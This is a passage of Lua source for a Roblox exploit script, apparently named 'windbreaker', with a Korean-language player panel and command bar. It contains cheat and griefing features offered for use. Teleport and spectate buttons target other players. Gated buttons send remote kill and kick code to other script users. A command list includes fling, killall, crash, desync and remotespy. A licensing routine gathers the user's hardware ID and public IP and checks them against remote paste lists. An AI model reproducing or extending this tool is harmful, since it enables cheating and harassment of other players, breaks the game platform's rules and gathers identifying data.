		frame9.BackgroundTransparency = 1
		frame9.Parent = frame7
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(0, 50, 0, 50)
		imageLabel.Position = UDim2.new(0, 0, 0, 0)
		imageLabel.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
		imageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
		imageLabel.Parent = frame9
		local uiCorner10 = Instance.new("UICorner")
		uiCorner10.CornerRadius = UDim.new(0, 8)
		uiCorner10.Parent = imageLabel

		task.spawn(function()
			local userThumbnailAsync, userThumbnailAsync2 = Players:GetUserThumbnailAsync(arg.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)

			if userThumbnailAsync2 and imageLabel and imageLabel.Parent then
				imageLabel.Image = userThumbnailAsync
			end
		end)

		local frame10 = Instance.new("Frame")
		frame10.Size = UDim2.new(1, -58, 0, 50)
		frame10.Position = UDim2.new(0, 58, 0, 0)
		frame10.BackgroundTransparency = 1
		frame10.Parent = frame9
		local textLabel6 = Instance.new("TextLabel")
		textLabel6.Size = UDim2.new(1, 0, 0, 16)
		textLabel6.Position = UDim2.new(0, 0, 0, 0)
		textLabel6.BackgroundTransparency = 1
		textLabel6.Font = Enum.Font.GothamBold
		textLabel6.TextSize = 13
		textLabel6.Text = arg.DisplayName
		textLabel6.TextColor3 = Color3.fromRGB(245, 245, 255)
		textLabel6.TextXAlignment = Enum.TextXAlignment.Left
		textLabel6.TextTruncate = Enum.TextTruncate.AtEnd
		textLabel6.Parent = frame10
		local textLabel7 = Instance.new("TextLabel")
		textLabel7.Size = UDim2.new(1, 0, 0, 14)
		textLabel7.Position = UDim2.new(0, 0, 0, 16)
		textLabel7.BackgroundTransparency = 1
		textLabel7.Font = Enum.Font.Gotham
		textLabel7.TextSize = 11
		textLabel7.Text = "@" .. arg.Name
		textLabel7.TextColor3 = Color3.fromRGB(160, 160, 180)
		textLabel7.TextXAlignment = Enum.TextXAlignment.Left
		textLabel7.TextTruncate = Enum.TextTruncate.AtEnd
		textLabel7.Parent = frame10
		local textLabel8 = Instance.new("TextLabel")
		textLabel8.Size = UDim2.new(1, 0, 0, 14)
		textLabel8.Position = UDim2.new(0, 0, 0, 32)
		textLabel8.BackgroundTransparency = 1
		textLabel8.Font = Enum.Font.GothamBold
		textLabel8.TextSize = 10
		textLabel8.Text = v3 and "[unknown script user]" or ""
		textLabel8.TextColor3 = Color3.fromRGB(0, 220, 255)
		textLabel8.TextXAlignment = Enum.TextXAlignment.Left
		textLabel8.Parent = frame10
		local frame11 = Instance.new("Frame")
		frame11.Size = UDim2.new(1, 0, 0, 24)
		frame11.Position = UDim2.new(0, 0, 0, 56)
		frame11.BackgroundTransparency = 1
		frame11.Parent = frame9
		local textButton6 = Instance.new("TextButton")
		textButton6.Size = UDim2.new(0.333, -3, 1, 0)
		textButton6.Position = UDim2.new(0, 0, 0, 0)
		textButton6.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
		textButton6.BorderSizePixel = 0
		textButton6.Font = Enum.Font.GothamBold
		textButton6.TextSize = 11
		textButton6.Text = "📋 복사"
		textButton6.TextColor3 = Color3.fromRGB(220, 225, 255)
		textButton6.Parent = frame11
		local uiCorner11 = Instance.new("UICorner")
		uiCorner11.CornerRadius = UDim.new(0, 6)
		uiCorner11.Parent = textButton6

		textButton6.MouseButton1Click:Connect(function()
			pcall(function()
				if setclipboard then
					setclipboard(arg.Name)
				elseif toclipboard then
					toclipboard(arg.Name)
				end
			end)

			pcall(function()
				if notify then
					notify("이름 복사", arg.Name .. " 닉네임이 클립보드에 복사되었습니다.", 2)
				end
			end)
		end)

		local textButton7 = Instance.new("TextButton")
		textButton7.Size = UDim2.new(0.333, -3, 1, 0)
		textButton7.Position = UDim2.new(0.333, 1, 0, 0)
		textButton7.BackgroundColor3 = v2 == arg and Color3.fromRGB(0, 140, 190) or Color3.fromRGB(32, 32, 44)
		textButton7.BorderSizePixel = 0
		textButton7.Font = Enum.Font.GothamBold
		textButton7.TextSize = 11
		textButton7.Text = v2 == arg and "❌ 해제" or "👁️ 보기"
		textButton7.TextColor3 = Color3.fromRGB(220, 225, 255)
		textButton7.Parent = frame11
		local uiCorner12 = Instance.new("UICorner")
		uiCorner12.CornerRadius = UDim.new(0, 6)
		uiCorner12.Parent = textButton7

		textButton7.MouseButton1Click:Connect(function()
			fn10(arg)
		end)

		local textButton8 = Instance.new("TextButton")
		textButton8.Size = UDim2.new(0.334, -3, 1, 0)
		textButton8.Position = UDim2.new(0.666, 2, 0, 0)
		textButton8.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
		textButton8.BorderSizePixel = 0
		textButton8.Font = Enum.Font.GothamBold
		textButton8.TextSize = 11
		textButton8.Text = "⚡ 텔포"
		textButton8.TextColor3 = Color3.fromRGB(220, 225, 255)
		textButton8.Parent = frame11
		local uiCorner13 = Instance.new("UICorner")
		uiCorner13.CornerRadius = UDim.new(0, 6)
		uiCorner13.Parent = textButton8

		textButton8.MouseButton1Click:Connect(function()
			fn11(arg)
		end)

		local frame12 = Instance.new("Frame")
		frame12.Size = UDim2.new(1, 0, 0, 26)
		frame12.Position = UDim2.new(0, 0, 0, 86)
		frame12.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
		frame12.BorderSizePixel = 0
		frame12.Parent = frame9
		local uiCorner14 = Instance.new("UICorner")
		uiCorner14.CornerRadius = UDim.new(0, 6)
		uiCorner14.Parent = frame12
		local textLabel9 = Instance.new("TextLabel")
		textLabel9.Size = UDim2.new(0.5, -6, 1, 0)
		textLabel9.Position = UDim2.new(0, 6, 0, 0)
		textLabel9.BackgroundTransparency = 1
		textLabel9.Font = Enum.Font.GothamBold
		textLabel9.TextSize = 11
		textLabel9.Text = "Kills: 0"
		textLabel9.TextColor3 = Color3.fromRGB(240, 200, 80)
		textLabel9.TextXAlignment = Enum.TextXAlignment.Left
		textLabel9.Parent = frame12
		local textLabel10 = Instance.new("TextLabel")
		textLabel10.Size = UDim2.new(0.5, -6, 1, 0)
		textLabel10.Position = UDim2.new(0.5, 0, 0, 0)
		textLabel10.BackgroundTransparency = 1
		textLabel10.Font = Enum.Font.GothamBold
		textLabel10.TextSize = 11
		textLabel10.Text = "Total Kills: 0"
		textLabel10.TextColor3 = Color3.fromRGB(255, 120, 80)
		textLabel10.TextXAlignment = Enum.TextXAlignment.Left
		textLabel10.Parent = frame12
		local frame13 = Instance.new("Frame")
		frame13.Size = UDim2.new(1, 0, 0, 24)
		frame13.Position = UDim2.new(0, 0, 0, 118)
		frame13.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
		frame13.BorderSizePixel = 0
		frame13.Parent = frame9
		local uiCorner15 = Instance.new("UICorner")
		uiCorner15.CornerRadius = UDim.new(0, 6)
		uiCorner15.Parent = frame13
		local frame14 = Instance.new("Frame")
		frame14.Size = UDim2.new(1, 0, 1, 0)
		frame14.BackgroundColor3 = Color3.fromRGB(52, 211, 153)
		frame14.BorderSizePixel = 0
		frame14.Parent = frame13
		local uiCorner16 = Instance.new("UICorner")
		uiCorner16.CornerRadius = UDim.new(0, 6)
		uiCorner16.Parent = frame14
		local textLabel11 = Instance.new("TextLabel")
		textLabel11.Size = UDim2.new(1, -75, 1, 0)
		textLabel11.Position = UDim2.new(0, 8, 0, 0)
		textLabel11.BackgroundTransparency = 1
		textLabel11.Font = Enum.Font.GothamBold
		textLabel11.TextSize = 10
		textLabel11.Text = "100 / 100 HP"
		textLabel11.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel11.TextXAlignment = Enum.TextXAlignment.Left
		textLabel11.Parent = frame13
		local textLabel12 = Instance.new("TextLabel")
		textLabel12.Size = UDim2.new(0, 64, 0, 18)
		textLabel12.Position = UDim2.new(1, -68, 0, 3)
		textLabel12.BackgroundColor3 = Color3.fromRGB(200, 45, 45)
		textLabel12.Font = Enum.Font.GothamBold
		textLabel12.TextSize = 10
		textLabel12.Text = "[ragdoll]"
		textLabel12.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel12.Visible = false
		textLabel12.Parent = frame13
		local uiCorner17 = Instance.new("UICorner")
		uiCorner17.CornerRadius = UDim.new(0, 4)
		uiCorner17.Parent = textLabel12

		if flag4 then
			local frame15 = Instance.new("Frame")
			frame15.Size = UDim2.new(1, 0, 0, 28)
			frame15.Position = UDim2.new(0, 0, 0, 148)
			frame15.BackgroundTransparency = 1
			frame15.Parent = frame9
			local textButton9 = Instance.new("TextButton")
			textButton9.Size = UDim2.new(0.5, -4, 1, 0)
			textButton9.Position = UDim2.new(0, 0, 0, 0)
			textButton9.BackgroundColor3 = Color3.fromRGB(190, 45, 45)
			textButton9.BorderSizePixel = 0
			textButton9.Font = Enum.Font.GothamBold
			textButton9.TextSize = 11
			textButton9.Text = "⚡ 킬 (Kill)"
			textButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton9.Parent = frame15
			local uiCorner18 = Instance.new("UICorner")
			uiCorner18.CornerRadius = UDim.new(0, 6)
			uiCorner18.Parent = textButton9

			textButton9.MouseButton1Click:Connect(function()
				task.spawn(function()
					if safeGet(arg.Name, "game.Players.LocalPlayer.Character.Humanoid.Health = 0") then
						if notify then
							notify("Kill", arg.Name .. "님에게 처치 명령을 전송했습니다", 3)
						end
					elseif notify then
						notify("Error", "명령 전송에 실패했습니다", 3)
					end
				end)
			end)

			local textButton10 = Instance.new("TextButton")
			textButton10.Size = UDim2.new(0.5, -4, 1, 0)
			textButton10.Position = UDim2.new(0.5, 4, 0, 0)
			textButton10.BackgroundColor3 = Color3.fromRGB(210, 105, 30)
			textButton10.BorderSizePixel = 0
			textButton10.Font = Enum.Font.GothamBold
			textButton10.TextSize = 11
			textButton10.Text = "🚫 킥 (Kick)"
			textButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton10.Parent = frame15
			local uiCorner19 = Instance.new("UICorner")
			uiCorner19.CornerRadius = UDim.new(0, 6)
			uiCorner19.Parent = textButton10

			textButton10.MouseButton1Click:Connect(function()
				task.spawn(function()
					if safeGet(arg.Name, "game.Players.LocalPlayer:Kick(\"강제 퇴장 처리되었습니다.\")") then
						if notify then
							notify("Kick", arg.Name .. "님에게 강퇴 명령을 전송했습니다", 3)
						end
					elseif notify then
						notify("Error", "명령 전송에 실패했습니다", 3)
					end
				end)
			end)
		end

		task.spawn(function()
			while true do
				if screenGui2 and screenGui2.Parent then
					if arg and arg.Parent == Players then
						local v4, v5 = fn14(arg)
						textLabel9.Text = "Kills: " .. tostring(v4)
						textLabel10.Text = "Total Kills: " .. tostring(v5)
						textLabel12.Visible = fn13(arg)
						textButton7.Text = v2 == arg and "❌ 해제" or "👁️ 보기"
						textButton7.BackgroundColor3 = v2 == arg and Color3.fromRGB(0, 140, 190) or Color3.fromRGB(32, 32, 44)
						local character = arg.Character
						character = character and character:FindFirstChildOfClass("Humanoid")

						if character and character.Health > 0 then
							local n2 = math.floor(character.Health)
							local n3 = math.floor(math.max(1, character.MaxHealth))
							local n4 = math.clamp(n2 / n3, 0, 1)
							textLabel11.Text = n2 .. " / " .. n3 .. " HP"
							frame14.Size = UDim2.new(n4, 0, 1, 0)

							if n4 > 0.5 then
								frame14.BackgroundColor3 = Color3.fromRGB(52, 211, 153)
							elseif n4 > 0.25 then
								frame14.BackgroundColor3 = Color3.fromRGB(245, 158, 11)
							else
								frame14.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
							end
						else
							textLabel11.Text = "0 / 100 HP (Dead)"
							frame14.Size = UDim2.new(0, 0, 1, 0)
						end

						task.wait(0.1)
						continue
					else
						textLabel11.Text = "Player Left"
						break
					end
				end

				break
			end
		end)
	end

	updateLeaderboardHud = function(arg)
		if not frame6 then
			return
		end

		if not arg and not frame6.Visible then
			return
		end
		local players = Players:GetPlayers()

		if textLabel4 then
			textLabel4.Visible = #players == 0
		end

		scrollingFrame3.CanvasSize = UDim2.new(0, 0, 0, #players * 54 + 10)
		local tbl5 = {}

		for i, player in ipairs(players) do
			tbl5[player] = true
			local v3 = tbl4.cards[player]

			if not v3 or not v3.Frame or not v3.Frame.Parent then
				local frame7 = Instance.new("Frame")
				frame7.Name = "LCard_" .. player.Name
				frame7.Size = UDim2.new(1, -4, 0, 48)
				frame7.LayoutOrder = i
				frame7.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
				frame7.BorderSizePixel = 0
				frame7.Parent = scrollingFrame3
				local uiCorner7 = Instance.new("UICorner")
				uiCorner7.CornerRadius = UDim.new(0, 8)
				uiCorner7.Parent = frame7
				local uiStroke3 = Instance.new("UIStroke")
				uiStroke3.Color = Color3.fromRGB(45, 45, 60)
				uiStroke3.Thickness = 1
				uiStroke3.Parent = frame7
				local textButton5 = Instance.new("TextButton")
				textButton5.Name = "ClickArea"
				textButton5.Size = UDim2.new(1, -125, 1, 0)
				textButton5.Position = UDim2.new(0, 0, 0, 0)
				textButton5.BackgroundTransparency = 1
				textButton5.Text = ""
				textButton5.Parent = frame7

				textButton5.MouseButton1Click:Connect(function()
					fn15(player)
				end)

				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Size = UDim2.new(0, 36, 0, 36)
				imageLabel.Position = UDim2.new(0, 6, 0, 6)
				imageLabel.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
				imageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
				imageLabel.Parent = frame7
				local uiCorner8 = Instance.new("UICorner")
				uiCorner8.CornerRadius = UDim.new(0, 6)
				uiCorner8.Parent = imageLabel

				task.spawn(function()
					local userThumbnailAsync, userThumbnailAsync2 = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size100x100)

					if userThumbnailAsync2 and imageLabel and imageLabel.Parent then
						imageLabel.Image = userThumbnailAsync
					end
				end)

				local textLabel5 = Instance.new("TextLabel")
				textLabel5.Size = UDim2.new(1, -170, 0, 16)
				textLabel5.Position = UDim2.new(0, 46, 0, 4)
				textLabel5.BackgroundTransparency = 1
				textLabel5.Font = Enum.Font.GothamBold
				textLabel5.TextSize = 11
				textLabel5.Text = player.DisplayName .. " (@" .. player.Name .. ")"
				textLabel5.TextColor3 = Color3.fromRGB(240, 240, 255)
				textLabel5.TextXAlignment = Enum.TextXAlignment.Left
				textLabel5.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel5.Parent = frame7
				local textLabel6 = Instance.new("TextLabel")
				textLabel6.Size = UDim2.new(1, -170, 0, 14)
				textLabel6.Position = UDim2.new(0, 46, 0, 19)
				textLabel6.BackgroundTransparency = 1
				textLabel6.Font = Enum.Font.Gotham
				textLabel6.TextSize = 9
				textLabel6.TextColor3 = Color3.fromRGB(140, 140, 160)
				textLabel6.TextXAlignment = Enum.TextXAlignment.Left
				textLabel6.Parent = frame7
				local textLabel7 = Instance.new("TextLabel")
				textLabel7.Size = UDim2.new(1, -170, 0, 12)
				textLabel7.Position = UDim2.new(0, 46, 0, 33)
				textLabel7.BackgroundTransparency = 1
				textLabel7.Font = Enum.Font.GothamSemibold
				textLabel7.TextSize = 9
				textLabel7.TextColor3 = Color3.fromRGB(220, 180, 80)
				textLabel7.TextXAlignment = Enum.TextXAlignment.Left
				textLabel7.Parent = frame7
				local textButton6 = Instance.new("TextButton")
				textButton6.Size = UDim2.new(0, 36, 0, 24)
				textButton6.Position = UDim2.new(1, -120, 0.5, -12)
				textButton6.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
				textButton6.BorderSizePixel = 0
				textButton6.Font = Enum.Font.GothamBold
				textButton6.TextSize = 10
				textButton6.Text = "복사"
				textButton6.TextColor3 = Color3.fromRGB(210, 215, 240)
				textButton6.Parent = frame7
				local uiCorner9 = Instance.new("UICorner")
				uiCorner9.CornerRadius = UDim.new(0, 4)
				uiCorner9.Parent = textButton6

				textButton6.MouseButton1Click:Connect(function()
					pcall(function()
						if setclipboard then
							setclipboard(player.Name)
						elseif toclipboard then
							toclipboard(player.Name)
						end
					end)

					pcall(function()
						if notify then
							notify("이름 복사", player.Name .. " 닉네임이 복사되었습니다.", 2)
						end
					end)
				end)

				local textButton7 = Instance.new("TextButton")
				textButton7.Size = UDim2.new(0, 36, 0, 24)
				textButton7.Position = UDim2.new(1, -80, 0.5, -12)
				textButton7.BackgroundColor3 = v2 == player and Color3.fromRGB(20, 50, 70) or Color3.fromRGB(38, 38, 52)
				textButton7.BorderSizePixel = 0
				textButton7.Font = Enum.Font.GothamBold
				textButton7.TextSize = 10
				textButton7.Text = v2 == player and "해제" or "보기"
				textButton7.TextColor3 = v2 == player and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(210, 215, 240)
				textButton7.Parent = frame7
				local uiCorner10 = Instance.new("UICorner")
				uiCorner10.CornerRadius = UDim.new(0, 4)
				uiCorner10.Parent = textButton7

				textButton7.MouseButton1Click:Connect(function()
					fn10(player)
				end)

				local textButton8 = Instance.new("TextButton")
				textButton8.Size = UDim2.new(0, 34, 0, 24)
				textButton8.Position = UDim2.new(1, -40, 0.5, -12)
				textButton8.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
				textButton8.BorderSizePixel = 0
				textButton8.Font = Enum.Font.GothamBold
				textButton8.TextSize = 10
				textButton8.Text = "TP"
				textButton8.TextColor3 = Color3.fromRGB(210, 215, 240)
				textButton8.Parent = frame7
				local uiCorner11 = Instance.new("UICorner")
				uiCorner11.CornerRadius = UDim.new(0, 4)
				uiCorner11.Parent = textButton8

				textButton8.MouseButton1Click:Connect(function()
					fn11(player)
				end)

				tbl4.cards[player] = { Frame = frame7, NameLabel = textLabel5, SubLabel = textLabel6, StatsLabel = textLabel7, ViewBtn = textButton7 }
				v3 = tbl4.cards[player]
			else
				v3.Frame.LayoutOrder = i
			end

			if fn12(player) then
				v3.SubLabel.Text = "[unknown script user]"
				v3.SubLabel.TextColor3 = Color3.fromRGB(0, 220, 255)
			else
				v3.SubLabel.Text = ""
			end

			local v4, v5 = fn14(player)
			v3.StatsLabel.Text = "Kills: " .. tostring(v4) .. " | Total: " .. tostring(v5)

			if v3.ViewBtn then
				v3.ViewBtn.Text = v2 == player and "해제" or "보기"
				v3.ViewBtn.TextColor3 = v2 == player and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(210, 215, 240)
				v3.ViewBtn.BackgroundColor3 = v2 == player and Color3.fromRGB(20, 50, 70) or Color3.fromRGB(38, 38, 52)
			end
		end

		for k, card in pairs(tbl4.cards) do
			if not tbl5[k] then
				if card.Frame and card.Frame.Parent then
					card.Frame:Destroy()
				end

				tbl4.cards[k] = nil
			end
		end
	end

	getgenv().updateLeaderboardHud = updateLeaderboardHud

	pcall(function()
		updateLeaderboardHud(true)
	end)

	task.spawn(function()
		while true do
			task.wait(1.5)

			if frame6 and frame6.Visible then
				updateLeaderboardHud()
			end
		end
	end)

	Players.PlayerAdded:Connect(function()
		task.wait(0.5)

		if frame6 and frame6.Visible then
			updateLeaderboardHud()
		end
	end)

	Players.PlayerRemoving:Connect(function()
		task.wait(0.1)

		if frame6 and frame6.Visible then
			updateLeaderboardHud()
		end
	end)
end

local userRank

do
	local userRole = "free"
	userRank = 1

	local function parseResponse(res)
		local _httprequest = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

		if _httprequest then
			local ok, result = pcall(function()
				return _httprequest({ Url = res, Method = "GET" })
			end)

			if ok and result and result.Body and result.Body ~= "" and not result.Body:find("<!DOCTYPE") then
				return result.Body
			end
		end

		local ok, result = pcall(function()
			return game:HttpGet(res)
		end)

		if ok and type(result) == "string" and result ~= "" and not result:find("<!DOCTYPE") then
			return result
		end
		return nil
	end

	local function getHwid2()
		local str = ""

		pcall(function()
			if gethwid then
				str = gethwid()
			elseif get_hwid then
				str = get_hwid()
			elseif syn and syn.gethwid then
				str = syn.gethwid()
			elseif fluxus and fluxus.gethwid then
				str = fluxus.gethwid()
			elseif game:GetService("RbxAnalyticsService") then
				str = game:GetService("RbxAnalyticsService"):GetClientId()
			end
		end)

		return type(str) == "string" and str:lower():gsub("%s+", "") or ""
	end

	local function getGlobal()
		local str = ""

		pcall(function()
			local statusCode = parseResponse("https://api.ipify.org") or parseResponse("https://ipinfo.io/ip") or parseResponse("https://icanhazip.com")

			if statusCode then
				str = statusCode:gsub("%s+", "")
			end
		end)

		return type(str) == "string" and str:lower() or ""
	end

	local function getHwid3()
		local localPlayer = game:GetService("Players").LocalPlayer
		local str = localPlayer and localPlayer.Name and localPlayer.Name:lower():gsub("%s+", "") or ""
		local hwid = getHwid2()
		local v = getGlobal()

		pcall(function()
			local str2 = tostring(os.time()) .. "_" .. tostring(math.random(10000, 99999))

			for _, v2 in ipairs({
				"https://pastefy.app/znPN1Zk7/raw?cb=" .. str2,
				"https://pastefy.app/znPN1Zk7/raw",
				"https://pastefy.app/msodmsxc/raw?cb=" .. str2,
				"https://pastefy.app/msodmsxc/raw",
			}) do
				local statusCode = parseResponse(v2)

				if statusCode and statusCode ~= "" then
					for match in statusCode:gmatch("[^\r\n]+") do
						local match2, match3 = match:match("^([^|]+)|(.+)$")

						if match2 and match3 then
							local str3 = match2:lower():gsub("%s+", "")
							local str4 = match3:lower():gsub("%s+", "")
							local flag

							if str ~= "" and str3 == str then
								flag = true
							elseif hwid ~= "" and str3 == hwid then
								flag = true
							else
								local flag2 = v ~= "" and str3 == v
								flag = false

								if flag2 then
									flag = true
								end
							end

							if flag then
								if str4:find("owner") or str4:find("woner") or str4:find("admin") or str4:find("관리자") then
									userRole = "owner"
									userRank = 3
								elseif str4:find("pe") or str4:find("premium") or str4:find("프리미엄") then
									userRole = "pe"
									userRank = 2
								end

								return
							end
						end
					end
				end
			end
		end)
	end

	getHwid3()
	getgenv().userRole = userRole
end

getgenv().userRank = userRank
local getGlobal

local tbl3 = {
	forcecmd = 3,
	forceinvite = 3,
	finvite = 3,
	scriptacc = 3,
	allacc = 3,
	message = 3,
	msg = 3,
	kill = 2,
	kick = 2,
	listofuser = 2,
	lou = 2,
	aikeyboard = 2,
	fakepos = 2,
	desync = 2,
	fakeclipgui = 2,
	fakeclip = 2,
}

getGlobal = function(key)
	if not key or type(key) ~= "string" then
		return 1
	end
	return tbl3[key:lower():gsub("%s+", ""):split("/")[1]:split("(")[1]:gsub("%s+", "")] or 1
end

local fn

local tbl4 = {
	kill = true,
	tp = true,
	goto = true,
	to = true,
	reset = true,
	respawn = true,
	re = true,
	refresh = true,
	rejoin = true,
	rj = true,
	kick = true,
	ban = true,
	crash = true,
	serverhop = true,
	hop = true,
	chat = true,
	talk = true,
	whisper = true,
	pm = true,
	message = true,
	msg = true,
	tell = true,
	clear = true,
	cls = true,
	cpos = true,
	dpos = true,
	loadpos = true,
	savepos = true,
	removealias = true,
	addalias = true,
	cmdbar = true,
	exit = true,
	quit = true,
	close = true,
	minimize = true,
	maximize = true,
	fling = true,
	bring = true,
	fenv = true,
	heal = true,
	fire = true,
	void = true,
	mute = true,
	ff = true,
	gasp = true,
	gp = true,
	size = true,
	scale = true,
	addbind = true,
	removebind = true,
	clearbinds = true,
	show = true,
	hide = true,
	shutdown = true,
	teleport = true,
	tpposition = true,
	setwaypoint = true,
	delwaypoint = true,
	clearwaypoints = true,
	copy = true,
	print = true,
	warn = true,
	error = true,
	ping = true,
	fps = true,
	age = true,
	jobid = true,
	gameid = true,
	help = true,
	cmds = true,
	commands = true,
	version = true,
	credits = true,
	hax = true,
	explore = true,
	dex = true,
	remotespy = true,
	rspy = true,
	naked = true,
	blocky = true,
	r6 = true,
	r15 = true,
	unanchor = true,
	anchor = true,
	sit = true,
	jump = true,
	killall = true,
	loopkillall = true,
	forcecmd = true,
	fcmd = true,
	force = true,
	forceinvite = true,
	finvite = true,
	forceinv = true,
	scriptacc = true,
	allacc = true,
	acc = true,
	announce = true,
	notice = true,
	serverinfo = true,
	sinfo = true,
	server = true,
	resettp = true,
	crabadd = true,
	crabspawn = true,
	addplugin = true,
	deleteplugin = true,
	delplugin = true,
	removeplugin = true,
	addvape = true,
	delvape = true,
	vapeadd = true,
	vapedel = true,
	setvape = true,
	vapeset = true,
	vapebind = true,
	targetbind = true,
	hudbind = true,
	vape = true,
	vapegui = true,
	vapehud = true,
	plugins = true,
}

fn = function(arg)
	local str = arg:lower()

	local tbl5 = {
		clip = "Noclip",
		visible = "Invisible",
		uninvisable = "invisable",
		uninvis = "invis",
		uninvisible = "invisible",
		untsbinvis = "tsbinvis",
		noesp = "ESP",
		notracers = "Tracers",
		noboxes = "Boxes",
		nonames = "Names",
		nospin = "Spin",
		nofloat = "Float",
		noswim = "Swim",
		noclicktp = "Click TP",
		noclickdelete = "Click Delete",
		unview = "View",
		unspectate = "Spectate",
		unnoanim = "No Anim",
		unnoanime = "No Anim",
		unbypassantiskill = "No Anim",
		unbypassantiskills = "No Anim",
	}

	if tbl5[str] then
		local v = tbl5[str]
		getgenv().delvape(v)
		return
	end

	if str:sub(1, 2) == "un" then
		local str2 = str:sub(3)
		if not tbl4[str2] then
			getgenv().delvape(str2)
			return
		end
	end

	if not tbl4[str] then
		getgenv().addvape(str)
	end
end

shade1 = {}
shade2 = {}
shade3 = {}
text1 = {}
text2 = {}
scroll = {}
Holder.Name = randomString()
Holder.Parent = PARENT
Holder.Active = true
Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Holder.BorderSizePixel = 0
Holder.Position = UDim2.new(1, -250, 1, -220)
Holder.Size = UDim2.new(0, 250, 0, 220)
Holder.ZIndex = 10
table.insert(shade2, Holder)
Title.Name = "Title"
Title.Parent = Holder
Title.Active = true
Title.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 250, 0, 20)
Title.Font = Enum.Font.SourceSans
Title.TextSize = 18
Title.Text = "windbreaker v" .. currentVersion

do
	local function testHasher(data)
		local n = math.floor(data / 100)
		local n2 = (19 * data % 19 + (15 - math.floor((13 + 8 * n) / 25) + n - math.floor(n / 4)) % 30) % 30
		local n3 = (2 * data % 4 + 4 * data % 7 + 6 * n2 + (4 + n - math.floor(n / 4)) % 7) % 7
		local n4 = 22 + n2 + n3
		if n2 == 29 and n3 == 6 then
			return "04 19"
		end

		if n2 == 28 and n3 == 6 then
			return "04 18"
		end

		if n4 > 31 then
			return ("04 %02d"):format(n4 - 31)
		end
		return ("03 %02d"):format(n4)
	end

	local v = ({ ["01 01"] = "??", [testHasher(tonumber(os.date("%Y")))] = "??", ["10 31"] = "??", ["12 25"] = "??" })[os.date("%m %d")]

	if v then
		Title.Text = ("%s %s %s"):format(v, Title.Text, v)
	end
end

Title.TextColor3 = Color3.new(1, 1, 1)
Title.ZIndex = 10
table.insert(shade1, Title)
table.insert(text1, Title)
Dark.Name = "Dark"
Dark.Parent = Holder
Dark.Active = true
Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Dark.BorderSizePixel = 0
Dark.Position = UDim2.new(0, 0, 0, 45)
Dark.Size = UDim2.new(0, 250, 0, 175)
Dark.ZIndex = 10
table.insert(shade1, Dark)
Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = Holder
Cmdbar.BackgroundTransparency = 1
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(0, 5, 0, 20)
Cmdbar.Size = UDim2.new(0, 240, 0, 25)
Cmdbar.Font = Enum.Font.SourceSans
Cmdbar.TextSize = 18
Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
Cmdbar.TextColor3 = Color3.new(1, 1, 1)
Cmdbar.Text = ""
Cmdbar.ZIndex = 12
Cmdbar.Active = true
Cmdbar.TextEditable = true
Cmdbar.PlaceholderText = "Command Bar"
CMDsF.Name = "CMDs"
CMDsF.Parent = Holder
CMDsF.BackgroundTransparency = 1
CMDsF.BorderSizePixel = 0
CMDsF.Position = UDim2.new(0, 5, 0, 45)
CMDsF.Size = UDim2.new(0, 245, 0, 175)
CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.ScrollBarThickness = 8
CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.VerticalScrollBarInset = "Always"
CMDsF.ZIndex = 10
table.insert(scroll, CMDsF)
cmdListLayout.Parent = CMDsF
SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = Holder
SettingsButton.BackgroundTransparency = 1
SettingsButton.Position = UDim2.new(0, 230, 0, 0)
SettingsButton.Size = UDim2.new(0, 20, 0, 20)
SettingsButton.Image = "rbxassetid://1204397029"
SettingsButton.ZIndex = 10
ReferenceButton = Instance.new("ImageButton")
ReferenceButton.Name = "ReferenceButton"
ReferenceButton.Parent = Holder
ReferenceButton.BackgroundTransparency = 1
ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
ReferenceButton.Image = "rbxassetid://3523243755"
ReferenceButton.ZIndex = 10
Settings.Name = "Settings"
Settings.Parent = Holder
Settings.Active = true
Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0, 220)
Settings.Size = UDim2.new(0, 250, 0, 175)
Settings.ZIndex = 10
table.insert(shade1, Settings)
SettingsHolder = Instance.new("ScrollingFrame")
SettingsHolder.Name = "Holder"
SettingsHolder.Parent = Settings
SettingsHolder.BackgroundTransparency = 1
SettingsHolder.BorderSizePixel = 0
SettingsHolder.Size = UDim2.new(1, 0, 1, 0)
